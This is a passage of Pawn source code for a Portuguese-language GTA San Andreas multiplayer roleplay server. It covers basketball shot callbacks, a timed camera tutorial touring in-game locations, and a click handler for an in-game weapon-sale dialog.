	MoveObject(Ball, 2794.9612+random(2), -2019.5415+random(2), 15.5075+random(2), 12.5+random(4));
	ApplyAnimation(playerid,"BSKTBALL","BBALL_Jump_Shot",4.0,0,0,0,0,0);
	ShootingBall = 4;
	HavingBall[playerid] = 0;
	return 1;
}

forward ShootMiss2(playerid);
public ShootMiss2(playerid)
{
	MoveObject(Ball, 2768.6289+random(2),-2019.7227+random(2),15.6287+random(2), 12.5+random(4));
	ApplyAnimation(playerid,"BSKTBALL","BBALL_Jump_Shot",4.0,0,0,0,0,0);
	ShootingBall = 5;
	HavingBall[playerid] = 0;
	return 1;
}

forward ClearAnim(playerid);
public ClearAnim(playerid)
{
	ClearAnimations(playerid);
	return 1;
}

forward TutoBanco(playerid);
public TutoBanco(playerid)
{
	SetPlayerPos(playerid, 1807.4254,-1700.4542,13.3029);
	SetPlayerCameraPos(playerid, 1821.9635,-1744.4658,24.5654);
	SetPlayerCameraLookAt(playerid, 1802.2194,-1732.8411,13.3906);
  	TogglePlayerControllable(playerid, false);
  	PlayerTextDrawHide(playerid, TutoText[playerid][0]);
	PlayerTextDrawHide(playerid, TutoText[playerid][1]);
  	PlayerTextDrawHide(playerid, TutoText[playerid][2]);
  	PlayerTextDrawHide(playerid, TutoText[playerid][3]);
  	PlayerTextDrawHide(playerid, TutoText[playerid][4]);
  	PlayerTextDrawHide(playerid, TutoText[playerid][5]);
	TextDrawShowForPlayer(playerid, BancoTuto[0]);
  	TextDrawShowForPlayer(playerid, BancoTuto[1]);
  	TextDrawShowForPlayer(playerid, BancoTuto[2]);
  	TextDrawShowForPlayer(playerid, BancoTuto[3]);
  	TextDrawShowForPlayer(playerid, BancoTuto[4]);
  	SetTimerEx("TutoPrefeitura", 18000, false, "i", playerid);
  	return 1;
}

forward TutoPrefeitura(playerid);
public TutoPrefeitura(playerid)
{
	SetPlayerPos(playerid, 1482.4447,-1785.0928,10.1966);
	SetPlayerCameraPos(playerid, 1494.8756,-1753.9067,50.4450);
	SetPlayerCameraLookAt(playerid, 1481.4636,-1799.4524,13.6313);
	TogglePlayerControllable(playerid, false);
  	TextDrawHideForPlayer(playerid, BancoTuto[0]);
	TextDrawHideForPlayer(playerid, BancoTuto[1]);
  	TextDrawHideForPlayer(playerid, BancoTuto[2]);
  	TextDrawHideForPlayer(playerid, BancoTuto[3]);
  	TextDrawHideForPlayer(playerid, BancoTuto[4]);
	TextDrawShowForPlayer(playerid, PrefeituraTuto[0]);
  	TextDrawShowForPlayer(playerid, PrefeituraTuto[1]);
  	TextDrawShowForPlayer(playerid, PrefeituraTuto[2]);
  	TextDrawShowForPlayer(playerid, PrefeituraTuto[3]);
  	SetTimerEx("TutoDelegacia", 18000, false, "i", playerid);
  	return 1;
}

forward TutoDelegacia(playerid);
public TutoDelegacia(playerid)
{
	SetPlayerPos(playerid, 1514.7988,-1688.0758,12.2422);
	SetPlayerCameraPos(playerid, 1515.3904,-1711.6589,22.1695);
	SetPlayerCameraLookAt(playerid, 1552.2196,-1674.9835,16.1907);
	TogglePlayerControllable(playerid, false);
  	TextDrawHideForPlayer(playerid, PrefeituraTuto[0]);
	TextDrawHideForPlayer(playerid, PrefeituraTuto[1]);
  	TextDrawHideForPlayer(playerid, PrefeituraTuto[2]);
  	TextDrawHideForPlayer(playerid, PrefeituraTuto[3]);
	TextDrawShowForPlayer(playerid, DelegaciaTuto[0]);
  	TextDrawShowForPlayer(playerid, DelegaciaTuto[1]);
  	TextDrawShowForPlayer(playerid, DelegaciaTuto[2]);
  	TextDrawShowForPlayer(playerid, DelegaciaTuto[3]);
   	TextDrawShowForPlayer(playerid, DelegaciaTuto[4]);
  	SetTimerEx("TutoAuto", 18000, false, "i", playerid);
  	return 1;
}

forward TutoAuto(playerid);
public TutoAuto(playerid)
{
	SetPlayerPos(playerid, 1623.9338,-1333.0082,12.4610);
	SetPlayerCameraPos(playerid, 1613.8163,-1306.3540,29.3279);
	SetPlayerCameraLookAt(playerid, 1637.9990,-1327.9093,17.4531);
	TogglePlayerControllable(playerid, false);
  	TextDrawHideForPlayer(playerid, DelegaciaTuto[0]);
	TextDrawHideForPlayer(playerid, DelegaciaTuto[1]);
  	TextDrawHideForPlayer(playerid, DelegaciaTuto[2]);
  	TextDrawHideForPlayer(playerid, DelegaciaTuto[3]);
  	TextDrawHideForPlayer(playerid, DelegaciaTuto[4]);
	TextDrawShowForPlayer(playerid, AutoEscolaTuto[0]);
  	TextDrawShowForPlayer(playerid, AutoEscolaTuto[1]);
  	TextDrawShowForPlayer(playerid, AutoEscolaTuto[2]);
  	TextDrawShowForPlayer(playerid, AutoEscolaTuto[3]);
  	SetTimerEx("TutoHospital", 18000, false, "i", playerid);
  	return 1;
}

forward TutoHospital(playerid);
public TutoHospital(playerid)
{
	SetPlayerPos(playerid, 1221.7490,-1329.4076,7.4823);
	SetPlayerCameraPos(playerid, 1196.1722,-1307.4220,15.4933);
	SetPlayerCameraLookAt(playerid, 1161.3822,-1333.9138,18.5351);
	TogglePlayerControllable(playerid, false);
  	TextDrawHideForPlayer(playerid, AutoEscolaTuto[0]);
	TextDrawHideForPlayer(playerid, AutoEscolaTuto[1]);
  	TextDrawHideForPlayer(playerid, AutoEscolaTuto[2]);
  	TextDrawHideForPlayer(playerid, AutoEscolaTuto[3]);
	TextDrawShowForPlayer(playerid, HospitalTuto[0]);
  	TextDrawShowForPlayer(playerid, HospitalTuto[1]);
  	TextDrawShowForPlayer(playerid, HospitalTuto[2]);
  	TextDrawShowForPlayer(playerid, HospitalTuto[3]);
   	TextDrawShowForPlayer(playerid, HospitalTuto[4]);
  	SetTimerEx("TutoPosto", 18000, false, "i", playerid);
  	return 1;
}

forward TutoPosto(playerid);
public TutoPosto(playerid)
{
	SetPlayerPos(playerid, 1926.6771,-1768.3055,13.5469);
	SetPlayerCameraPos(playerid, 1956.1354,-1788.3785,15.0142);
	SetPlayerCameraLookAt(playerid, 1926.6771,-1768.3055,13.5469);
	TogglePlayerControllable(playerid, false);
  	TextDrawHideForPlayer(playerid, HospitalTuto[0]);
	TextDrawHideForPlayer(playerid, HospitalTuto[1]);
  	TextDrawHideForPlayer(playerid, HospitalTuto[2]);
  	TextDrawHideForPlayer(playerid, HospitalTuto[3]);
  	TextDrawHideForPlayer(playerid, HospitalTuto[4]);
	TextDrawShowForPlayer(playerid, PostoTuto[0]);
  	TextDrawShowForPlayer(playerid, PostoTuto[1]);
  	TextDrawShowForPlayer(playerid, PostoTuto[2]);
  	SetTimerEx("TutoUtil", 13000, false, "i", playerid);
  	return 1;
}

forward TutoUtil(playerid);
public TutoUtil(playerid)
{
	SetPlayerPos(playerid, 1129.7732,-1489.9889,17.7690);
	SetPlayerCameraPos(playerid, 1107.4972,-1481.1316,36.1059);
	SetPlayerCameraLookAt(playerid, 1169.7773,-1489.6646,22.7560);
	TogglePlayerControllable(playerid, false);
  	TextDrawHideForPlayer(playerid, PostoTuto[0]);
	TextDrawHideForPlayer(playerid, PostoTuto[1]);
  	TextDrawHideForPlayer(playerid, PostoTuto[2]);
	TextDrawShowForPlayer(playerid, UtilTuto[0]);
  	TextDrawShowForPlayer(playerid, UtilTuto[1]);
  	TextDrawShowForPlayer(playerid, UtilTuto[2]);
  	SetTimerEx("TutoSkins", 13000, false, "i", playerid);
  	return 1;
}

forward TutoSkins(playerid);
public TutoSkins(playerid)
{
	SetPlayerPos(playerid, 2243.6008,-1627.8168,12.6394);
	SetPlayerCameraPos(playerid, 2247.6531,-1654.9840,17.5291);
	SetPlayerCameraLookAt(playerid, 2239.4626,-1673.6244,16.4082);
	TogglePlayerControllable(playerid, false);
  	TextDrawHideForPlayer(playerid, UtilTuto[0]);
	TextDrawHideForPlayer(playerid, UtilTuto[1]);
  	TextDrawHideForPlayer(playerid, UtilTuto[2]);
	TextDrawShowForPlayer(playerid, SkinTuto[0]);
  	TextDrawShowForPlayer(playerid, SkinTuto[1]);
  	TextDrawShowForPlayer(playerid, SkinTuto[2]);
  	SetTimerEx("TutoNeeds", 13000, false, "i", playerid);
  	return 1;
}

forward TutoNeeds(playerid);
public TutoNeeds(playerid)
{
	SetPlayerPos(playerid, 1208.2949,-958.8060,47.9398);
	SetPlayerCameraPos(playerid, 1228.8658,-940.3342,59.0947);
	SetPlayerCameraLookAt(playerid, 1201.2402,-917.3168,48.0625);
	TogglePlayerControllable(playerid, false);
  	TextDrawHideForPlayer(playerid, SkinTuto[0]);
	TextDrawHideForPlayer(playerid, SkinTuto[1]);
  	TextDrawHideForPlayer(playerid, SkinTuto[2]);
	TextDrawShowForPlayer(playerid, NeedsTuto[0]);
  	TextDrawShowForPlayer(playerid, NeedsTuto[1]);
  	TextDrawShowForPlayer(playerid, NeedsTuto[2]);
  	TextDrawShowForPlayer(playerid, NeedsTuto[3]);
  	SetTimerEx("TutoFim", 18500, false, "i", playerid);
  	return 1;
}

forward TutoFim(playerid);
public TutoFim(playerid)
{
  	TextDrawHideForPlayer(playerid, NeedsTuto[0]);
	TextDrawHideForPlayer(playerid, NeedsTuto[1]);
  	TextDrawHideForPlayer(playerid, NeedsTuto[2]);
  	TextDrawHideForPlayer(playerid, NeedsTuto[3]);
	TextDrawHideForPlayer(playerid, BaseTuto[0]);
	TextDrawHideForPlayer(playerid, BaseTuto[1]);
	TextDrawHideForPlayer(playerid, BaseTuto[2]);
	TextDrawHideForPlayer(playerid, BaseTuto[3]);
	if(WE_GetInt(gFile, "Registrado") == 1)
   	{
		SetPlayerPos(playerid, oPosx[playerid], oPosy[playerid], oPosz[playerid]);
		SetPlayerFacingAngle(playerid, oPosa[playerid]);
		SetCameraBehindPlayer(playerid);
	    TogglePlayerControllable(playerid, true);
	    NoTuto[playerid] = false;
  		LimparChat(playerid, 30);
  		SendClientMessage(playerid, VERMELHO_WE, "Você terminou a leitura do tutorial.");
  		SendClientMessage(playerid, AZUL_WE, "Para evitar problemas, quebra de regras, dentre outras situações, leia as regras, use: /Regras");
	}
	else
	{
	    pInfo[playerid][Prof] = DESEMPREGADO;
	    pInfo[playerid][MsgSpawn] = 1;
	    pInfo[playerid][pLogin] = true;
		SpawnPlayer(playerid);
	    SpawnProf(playerid);
		pInfo[playerid][EntrouL] = false;
	    NoTuto[playerid] = false;
		LimparChat(playerid, 30);
   	    SendClientMessage(playerid, VERMELHO_WE, "Você terminou a leitura do tutorial. Seja bem-vindo(a)");
	    SendClientMessage(playerid, AZUL_WE, "Para evitar problemas, quebra de regras, dentre outros, use: /Regras");
		format(gStr, sizeof(gStr), "~r~~h~BEM-VINDO(A) ~b~~h~%s", PlayerName(playerid));
		GameTextForPlayer(playerid, gStr, 5000, 1);
		WE_SetInt(gFile, "Registrado", 1);
	}
  	return 1;
}

@Callback: LiberarTutorial(playerid)
{
	TutoLiberado[playerid] = true;
	return 1;
}

@Callback: TutorialText(playerid, TextID)
{
	if(TextID == 1)
	{

		PlayerTextDrawSetString(playerid, TutoText[playerid][1], "O servidor");
		PlayerTextDrawSetString(playerid, TutoText[playerid][3], "A diversao e atracao do servidor nao ficara apenas nos trabalhos que voce pode pegar na Agencia de Empregos, como Caminhoneiro, Tranportador, Taxista, Piloto de Aviao, Policial e etc.. Aqui traremos o melhor do RP/G para a vida virtual, fazendo com que voce trabalhe, tenha sua casa, empresa e ate mesmo carro, podendo fazer novos amigos e interagir com eles pelo nosso TeamSpeak³.");
		PlayerTextDrawSetString(playerid, TutoText[playerid][4], "Proximo ~>~");
		Loop(i, 5)
		{
		    PlayerTextDrawShow(playerid, TutoText[playerid][i]);
		}
		SelectTextDraw(playerid, 0x9C9C9CAA);
	 	TutoLiberado[playerid] = false;
	 	SetTimerEx("LiberarTutorial", 7000, false, "i", playerid);
	}
	if(TextID == 2)
	{
	   	PlayerTextDrawSetString(playerid, TutoText[playerid][1], "Banco");
		PlayerTextDrawSetString(playerid, TutoText[playerid][3], "Esse e um dos bancos do servidor, no qual voce podera abrir uma conta bancaria. Aqui voce podera fazer operacoes como saques, transacoes e depositos bancarios. Recomendamos ter uma conta bancaria para poder manter seu dinheiro seguro. Para usar sua conta bancaria basta ir ao banco ou em um caixa e digitar: /Banco ou /Caixa. O limite de deposito por operacao e de 15 milhoes.");
		Loop(i, 6)
		{
		    PlayerTextDrawShow(playerid, TutoText[playerid][i]);
		}
		SelectTextDraw(playerid, 0x9C9C9CAA);
	 	TutoLiberado[playerid] = false;
	 	SetTimerEx("LiberarTutorial", 7000, false, "i", playerid);
	}
	if(TextID == 3)
	{
	   	PlayerTextDrawSetString(playerid, TutoText[playerid][1], "Prefeitura");
		PlayerTextDrawSetString(playerid, TutoText[playerid][3], "Essa e a prefeitura do servidor, o local de mais importancia do governo. Alem do banco, voce podera checar e pagar seus impostos aqui. Nos tempos de eleicao podera vir aqui se candidatar a presidencia da ~r~~h~W~b~~h~E~w~, ou votar. Caso tenha uma profissao politica, aqui sera seu spawn (Apenas se nao possuir residencia).");
		Loop(i, 6)
		{
		    PlayerTextDrawShow(playerid, TutoText[playerid][i]);
		}
		SelectTextDraw(playerid, 0x9C9C9CAA);
	 	TutoLiberado[playerid] = false;
	 	SetTimerEx("LiberarTutorial", 7000, false, "i", playerid);
	}
	if(TextID == 4)
	{
	   	PlayerTextDrawSetString(playerid, TutoText[playerid][1], "Delegacia");
		PlayerTextDrawSetString(playerid, TutoText[playerid][3], "Essa e a delegacia e o departamento da policia militar. Na delegacia voce podera ver os jogadores que estao presos, visitar e ate mesmo pagar fianca. E aqui onde voce pode comprar seu porte de armas. Caso voce for um infrator da lei, ao ser preso, voce sera levado de imediato a delegacia. O tempo de prisao varia de acordo com seu nivel de procurado, quanto maior for mais tempo voce ficara preso.");
		Loop(i, 6)
		{
		    PlayerTextDrawShow(playerid, TutoText[playerid][i]);
		}
		SelectTextDraw(playerid, 0x9C9C9CAA);
	 	TutoLiberado[playerid] = false;
	 	SetTimerEx("LiberarTutorial", 7000, false, "i", playerid);
	}
	if(TextID == 5)
	{
	   	PlayerTextDrawSetString(playerid, TutoText[playerid][1], "Auto Escola");
		PlayerTextDrawSetString(playerid, TutoText[playerid][3], "Essa e a auto escola, o local aonde voce deve ir tirar suas habilitacoes. Sao tres tipos de habitacao que voce pode adquirir, sendo elas: nautica, terrestre e aerea. Voce podera conduzir sem habilitacao ate completar 2 niveis, apos isso devera tirar sua habilitacao. Lembrando que o acumulo de multas pode resultar na perda da habilitacao.");
		Loop(i, 6)
		{
		    PlayerTextDrawShow(playerid, TutoText[playerid][i]);
		}
		SelectTextDraw(playerid, 0x9C9C9CAA);
	 	TutoLiberado[playerid] = false;
	 	SetTimerEx("LiberarTutorial", 7000, false, "i", playerid);
	}
	if(TextID == 6)
	{
	   	PlayerTextDrawSetString(playerid, TutoText[playerid][1], "Hospital");
		PlayerTextDrawSetString(playerid, TutoText[playerid][3], "Esse e um dos hospitais do servidor, localizado em Market. Toda vez que voce morrer, voce sera automaticamente levado ao hosptial, onde sera tratado. Caso nao queira pagar taxas, basta comprar um convenio medico, adquirido no hospital. A cada morte voce perde o dinheiro em maos, para evitar isso, contrate o seguro de acidentes. Aqui voce tambem pode tratar casos de drogas adquirindo cura.");
		Loop(i, 6)
		{
		    PlayerTextDrawShow(playerid, TutoText[playerid][i]);
		}
		SelectTextDraw(playerid, 0x9C9C9CAA);
	 	TutoLiberado[playerid] = false;
	 	SetTimerEx("LiberarTutorial", 7000, false, "i", playerid);
	}
	if(TextID == 7)
	{
	   	PlayerTextDrawSetString(playerid, TutoText[playerid][1], "Posto");
		PlayerTextDrawSetString(playerid, TutoText[playerid][3], "Esse e um dos postos de combustivel, localizado em Idlewood. Aqui voce podera abastecer seu tanque de combustivel, por ~g~R$2,00 ~w~reais o litro. Caso fique sem combustivel, basta procurar um dos varios postos que estao espalhados por San Andreas.");
		Loop(i, 6)
		{
		    PlayerTextDrawShow(playerid, TutoText[playerid][i]);
		}
		SelectTextDraw(playerid, 0x9C9C9CAA);
	 	TutoLiberado[playerid] = false;
	 	SetTimerEx("LiberarTutorial", 7000, false, "i", playerid);
	}
	if(TextID == 8)
	{
	   	PlayerTextDrawSetString(playerid, TutoText[playerid][1], "Loja de Utilitarios");
		PlayerTextDrawSetString(playerid, TutoText[playerid][3], "Essa e a loja de utilitarios do servidor. Aqui na loja de utilitarios voce encontra diversos itens, como celular, GPS, e outros. A loja de utilitarios e atualizada com frequencia para adicao ou atualizacao de itens.");
		Loop(i, 6)
		{
		    PlayerTextDrawShow(playerid, TutoText[playerid][i]);
		}
		SelectTextDraw(playerid, 0x9C9C9CAA);
	 	TutoLiberado[playerid] = false;
	 	SetTimerEx("LiberarTutorial", 7000, false, "i", playerid);
	}
	if(TextID == 9)
	{
	   	PlayerTextDrawSetString(playerid, TutoText[playerid][1], "Loja de Skins");
		PlayerTextDrawSetString(playerid, TutoText[playerid][3], "Essa e uma das lojas de roupas do servidor, localizada em Ganton. Alem de skins, voce podera tambem comprar itens, como oculos, chapeus e outros. E importante lembrar que cada loja possui skins diferentes.");
		PlayerTextDrawSetString(playerid, TutoText[playerid][4], "Proximo ~>~");
		Loop(i, 6)
		{
		    PlayerTextDrawShow(playerid, TutoText[playerid][i]);
		}
		SelectTextDraw(playerid, 0x9C9C9CAA);
	 	TutoLiberado[playerid] = false;
	 	SetTimerEx("LiberarTutorial", 7000, false, "i", playerid);
	}
	if(TextID == 10)
	{
	   	PlayerTextDrawSetString(playerid, TutoText[playerid][1], "Necessidades");
		PlayerTextDrawSetString(playerid, TutoText[playerid][3], "Essa e uma das lanchonetes do servidor, localizada em Vinewood. Apenas para alertas sobre o sistema de necessidades, a sua fome, sede e sono vai diminuindo com o passar do tempo. Quando a barra de fome encontrar-se zerada, voce desmaiara de fome, o mesmo para sede e sono.");
		PlayerTextDrawSetString(playerid, TutoText[playerid][4], "Terminar");
		Loop(i, 6)
		{
		    PlayerTextDrawShow(playerid, TutoText[playerid][i]);
		}
		SelectTextDraw(playerid, 0x9C9C9CAA);
	 	TutoLiberado[playerid] = false;
	 	SetTimerEx("LiberarTutorial", 7000, false, "i", playerid);
	}
	return 1;
}

public OnPlayerClickPlayerTextDraw(playerid, PlayerText:playertextid)
{
    	if(_:playertextid == INVALID_TEXT_DRAW)
			return CallLocalFunction("OnPlayerClickPlayerTextDraw", "ii", playerid, INVALID_TEXT_DRAW);

		if(playertextid == _ACEITAR[playerid])
		{
 			format(gstring, 256, "Você aceitou a arma %s vendida por %s para você por R$%d", ArmaNome(armaEscol[playerid]), PlayerName(compraArm[playerid]), preccArma[playerid]);
			SendClientMessage(playerid, COR_AMARELO, gstring);
			format(gstring, 256, "%s aceitou a arma %s vendida por você pelo valor R$%d", PlayerName(playerid), ArmaNome(armaEscol[playerid]), preccArma[playerid]);
			SendClientMessage(compraArm[playerid], COR_AMARELO, gstring);

			GivePlayerCash(playerid, -preccArma[playerid]);
			GivePlayerCash(compraArm[playerid], preccArma[playerid]);
			TraficArma(playerid);

			new
				stg[512]
			;
			format(gstring, sizeof(gstring), "\tARMA ILEGAL\n\n{23C8D0}> Essa arma é ilegal, você aceitou e pode utilizar a mesma sem sair do server.\n\n");
			strcat(stg, gstring);
			format(gstring, sizeof(gstring), "{23C8D0}> A mesma não é salva, após se desconectar-se do servidor você perde a arma.\n");
			strcat(stg, gstring);
			format(gstring, sizeof(gstring), "{23C8D0}> Caso você seja parado por policiais, você está sujeito a ser preso por uso de armas ilegais.\n");
			strcat(stg, gstring);
			format(gStr, sizeof(gStr), "{23C8D0}> Você só pode usar uma arma ilegal, caso compre outra a atual será substituída.\n");
			strcat(stg, gStr);
			ShowPlayerDialog(playerid, D_PARMA+3, DIALOG_STYLE_MSGBOX, "Arma Ilegal", stg, "OK", "");

		}
		else if(playertextid == _RECUSAR[playerid])
		{
		    format(gstring, 256, "Você recusou a arma %s oferecida por %s para você por R$%d", ArmaNome(armaEscol[playerid]), PlayerName(compraArm[playerid]), preccArma[playerid]);
			SendClientMessage(playerid, COR_ERRO, gstring);
			format(gstring, 256, "%s recusou a arma %s oferecida por você por R$%d", PlayerName(playerid), ArmaNome(compraArm[playerid]), preccArma[playerid]);
			SendClientMessage(compraArm[playerid], COR_ERRO, gstring);
		}
		else if(playertextid == TutoText[playerid][4])
		{
			if(TutoID[playerid] == 1)
			{
			    if(TutoLiberado[playerid] == false) return GameTextForPlayer(playerid, "~r~Aguarde alguns segundos...", 3000, 5);
				HideTutorial(playerid);
			    CancelSelectTextDraw(playerid);
				InterpolateCameraPos(playerid, 365.351654, -2145.143066, 41.203365, 1821.9635, -1744.4658, 24.5654, 7000);
				InterpolateCameraLookAt(playerid, 365.447052, -2140.324951, 39.870460, 1802.2194, -1732.8411, 13.3906, 7000);
				SetTimerEx("TutorialText", 7000, false, "id", playerid, 2);
				TutoID[playerid] = 2;
			    return 1;
			}
			else if(TutoID[playerid] == 2)
			{
			    if(TutoLiberado[playerid] == false) return GameTextForPlayer(playerid, "~r~Aguarde alguns segundos...", 3000, 5);
				HideTutorial(playerid);
			    CancelSelectTextDraw(playerid);
				InterpolateCameraPos(playerid, 1821.9635, -1744.4658, 24.5654, 1494.8756, -1753.9067, 50.4450, 7000);
				InterpolateCameraLookAt(playerid, 1802.2194, -1732.8411, 13.3906, 1481.4636, -1799.4524, 13.6313, 7000);
				SetTimerEx("TutorialText", 7000, false, "id", playerid, 3);
				TutoID[playerid] = 3;
			    return 1;
			}
			else if(TutoID[playerid] == 3)
			{
			    if(TutoLiberado[playerid] == false) return GameTextForPlayer(playerid, "~r~Aguarde alguns segundos...", 3000, 5);
				HideTutorial(playerid);
			    CancelSelectTextDraw(playerid);
				InterpolateCameraPos(playerid, 1494.8756, -1753.9067, 50.4450, 1515.3904, -1711.6589, 22.1695, 7000);
				InterpolateCameraLookAt(playerid, 1481.4636, -1799.4524, 13.6313, 1552.2196, -1674.9835, 16.1907, 7000);
				SetTimerEx("TutorialText", 7000, false, "id", playerid, 4);
				TutoID[playerid] = 4;
			    return 1;
			}
			else if(TutoID[playerid] == 4)
			{
			    if(TutoLiberado[playerid] == false) return GameTextForPlayer(playerid, "~r~Aguarde alguns segundos...", 3000, 5);
				HideTutorial(playerid);
			    CancelSelectTextDraw(playerid);
				InterpolateCameraPos(playerid, 1515.3904, -1711.6589, 22.1695, 1613.8163, -1306.3540, 29.3279, 7000);
				InterpolateCameraLookAt(playerid, 1552.2196, -1674.9835, 16.1907, 1637.9990, -1327.9093, 17.4531, 7000);
				SetTimerEx("TutorialText", 7000, false, "id", playerid, 5);
				TutoID[playerid] = 5;
			    return 1;
			}
			else if(TutoID[playerid] == 5)
			{
			    if(TutoLiberado[playerid] == false) return GameTextForPlayer(playerid, "~r~Aguarde alguns segundos...", 3000, 5);
				HideTutorial(playerid);
			    CancelSelectTextDraw(playerid);
				InterpolateCameraPos(playerid, 1613.8163, -1306.3540, 29.3279, 1196.1722, -1307.4220, 15.4933, 7000);
				InterpolateCameraLookAt(playerid, 1637.9990, -1327.9093, 17.4531, 1161.3822, -1333.9138, 18.5351, 7000);
				SetTimerEx("TutorialText", 7000, false, "id", playerid, 6);
				TutoID[playerid] = 6;
			    return 1;
			}
			else if(TutoID[playerid] == 6)
			{
			    if(TutoLiberado[playerid] == false) return GameTextForPlayer(playerid, "~r~Aguarde alguns segundos...", 3000, 5);
				HideTutorial(playerid);
			    CancelSelectTextDraw(playerid);
				InterpolateCameraPos(playerid, 1196.1722, -1307.4220, 15.4933, 1956.1354, -1788.3785, 15.0142, 7000);
				InterpolateCameraLookAt(playerid, 1161.3822, -1333.9138, 18.5351, 1926.6771, -1768.3055, 13.5469, 7000);
				SetTimerEx("TutorialText", 7000, false, "id", playerid, 7);
				TutoID[playerid] = 7;
			    return 1;
			}
			else if(TutoID[playerid] == 7)
			{
			    if(TutoLiberado[playerid] == false) return GameTextForPlayer(playerid, "~r~Aguarde alguns segundos...", 3000, 5);
				HideTutorial(playerid);
			    CancelSelectTextDraw(playerid);
				InterpolateCameraPos(playerid, 1956.1354, -1788.3785, 15.0142, 1107.4972, -1481.1316, 36.1059, 7000);
				InterpolateCameraLookAt(playerid, 1926.6771, -1768.3055, 13.5469, 1169.7773, -1489.6646, 22.7560, 7000);
				SetTimerEx("TutorialText", 7000, false, "id", playerid, 8);
				TutoID[playerid] = 8;
			    return 1;
			}
			else if(TutoID[playerid] == 8)
			{
			    if(TutoLiberado[playerid] == false) return GameTextForPlayer(playerid, "~r~Aguarde alguns segundos...", 3000, 5);
				HideTutorial(playerid);
			    CancelSelectTextDraw(playerid);
				InterpolateCameraPos(playerid, 1107.4972, -1481.1316, 36.1059, 2247.6531, -1654.9840, 17.5291, 7000);
				InterpolateCameraLookAt(playerid, 1169.7773, -1489.6646, 22.7560, 2239.4626, -1673.6244, 16.4082, 7000);
				SetTimerEx("TutorialText", 7000, false, "id", playerid, 9);
				TutoID[playerid] = 9;
			    return 1;
			}
			else if(TutoID[playerid] == 9)
			{
			    if(TutoLiberado[playerid] == false) return GameTextForPlayer(playerid, "~r~Aguarde alguns segundos...", 3000, 5);
				HideTutorial(playerid);
			    CancelSelectTextDraw(playerid);
				InterpolateCameraPos(playerid, 2247.6531, -1654.9840, 17.5291, 1228.8658, -940.3342, 59.0947, 7000);
				InterpolateCameraLookAt(playerid, 2239.4626, -1673.6244, 16.4082, 1201.2402, -917.3168, 48.0625, 7000);
				SetTimerEx("TutorialText", 7000, false, "id", playerid, 10);
				TutoID[playerid] = 10;
			    return 1;
			}
			else if(TutoID[playerid] == 10)
			{
			    if(TutoLiberado[playerid] == false) return GameTextForPlayer(playerid, "~r~Aguarde alguns segundos...", 3000, 5);
				CancelSelectTextDraw(playerid);
				HideTutorial(playerid);
				NoTuto[playerid] = false;
				TutoID[playerid] = 0;
				TogglePlayerSpectating(playerid, false);
				Loop(i, 6)
				{
				    PlayerTextDrawHide(playerid, TutoText[playerid][i]);
				}
				ShowTextDrawStatus(playerid);
				SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid, "Fome"));
				SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid, "Sede"));
				SetStatusBar(playerid, BAR_SONO, Player_barSleep[playerid], GetPVarInt(playerid, "Sono"));
				if(WE_GetInt(gFile, "Registrado") == 1)
			   	{
					SetSpawnInfo(playerid,0,pInfo[playerid][SkinP], oPosx[playerid], oPosy[playerid], oPosz[playerid], oPosa[playerid],0,0,0,0,0,0);
					SpawnPlayer(playerid);
					SetCameraBehindPlayer(playerid);
				    TogglePlayerControllable(playerid, true);
				    NoTuto[playerid] = false;
			  		LimparChat(playerid, 30);
			  		SendClientMessage(playerid, VERMELHO_WE, "Você terminou a leitura do tutorial.");
			  		SendClientMessage(playerid, AZUL_WE, "Para evitar problemas, quebra de regras, dentre outras situações, leia as regras, use: /Regras");
				}
				else
				{
				    pInfo[playerid][Prof] = DESEMPREGADO;
				    pInfo[playerid][MsgSpawn] = 1;
				    pInfo[playerid][pLogin] = true;
					SpawnPlayer(playerid);
				    SpawnProf(playerid);
					pInfo[playerid][EntrouL] = false;
				    NoTuto[playerid] = false;
					LimparChat(playerid, 30);
			   	    SendClientMessage(playerid, VERMELHO_WE, "Você terminou a leitura do tutorial. Seja bem-vindo(a)");
				    SendClientMessage(playerid, AZUL_WE, "Para evitar problemas, quebra de regras, dentre outros, use: /Regras");
					format(gStr, sizeof(gStr), "~r~~h~BEM-VINDO(A) ~b~~h~%s", PlayerName(playerid));
					GameTextForPlayer(playerid, gStr, 5000, 1);
					WE_SetInt(gFile, "Registrado", 1);
				}
			    return 1;
			}
		}
		else if(playertextid == TutoText[playerid][5])
		{
			if(TutoID[playerid] == 2)
			{
			    if(TutoLiberado[playerid] == false) return GameTextForPlayer(playerid, "~r~Aguarde alguns segundos...", 3000, 5);
				HideTutorial(playerid);
			    CancelSelectTextDraw(playerid);
				InterpolateCameraPos(playerid, 1821.9635, -1744.4658, 24.5654, 365.351654, -2145.143066, 41.203365, 7000);
				InterpolateCameraLookAt(playerid, 1802.2194, -1732.8411, 13.3906, 365.447052, -2140.324951, 39.870460, 7000);
				SetTimerEx("TutorialText", 7000, false, "id", playerid, 1);
				TutoID[playerid] = 1;
			    return 1;
			}
			else if(TutoID[playerid] == 3)
			{
			    if(TutoLiberado[playerid] == false) return GameTextForPlayer(playerid, "~r~Aguarde alguns segundos...", 3000, 5);
				HideTutorial(playerid);
			    CancelSelectTextDraw(playerid);
				InterpolateCameraPos(playerid, 1494.8756, -1753.9067, 50.4450, 1821.9635, -1744.4658, 24.5654, 7000);
				InterpolateCameraLookAt(playerid, 1481.4636, -1799.4524, 13.6313, 1802.2194, -1732.8411, 13.3906, 7000);
				SetTimerEx("TutorialText", 7000, false, "id", playerid, 2);
				TutoID[playerid] = 2;
			    return 1;
			}
			else if(TutoID[playerid] == 4)
			{
			    if(TutoLiberado[playerid] == false) return GameTextForPlayer(playerid, "~r~Aguarde alguns segundos...", 3000, 5);
				HideTutorial(playerid);
			    CancelSelectTextDraw(playerid);
				InterpolateCameraPos(playerid, 1515.3904, -1711.6589, 22.1695, 1494.8756, -1753.9067, 50.4450, 7000);
				InterpolateCameraLookAt(playerid, 1552.2196, -1674.9835, 16.1907, 1481.4636, -1799.4524, 13.6313, 7000);
				SetTimerEx("TutorialText", 7000, false, "id", playerid, 3);
				TutoID[playerid] = 3;
			    return 1;
			}
			else if(TutoID[playerid] == 5)
			{
			    if(TutoLiberado[playerid] == false) return GameTextForPlayer(playerid, "~r~Aguarde alguns segundos...", 3000, 5);
				HideTutorial(playerid);
			    CancelSelectTextDraw(playerid);
				InterpolateCameraPos(playerid, 1613.8163, -1306.3540, 29.3279, 1515.3904, -1711.6589, 22.1695, 7000);
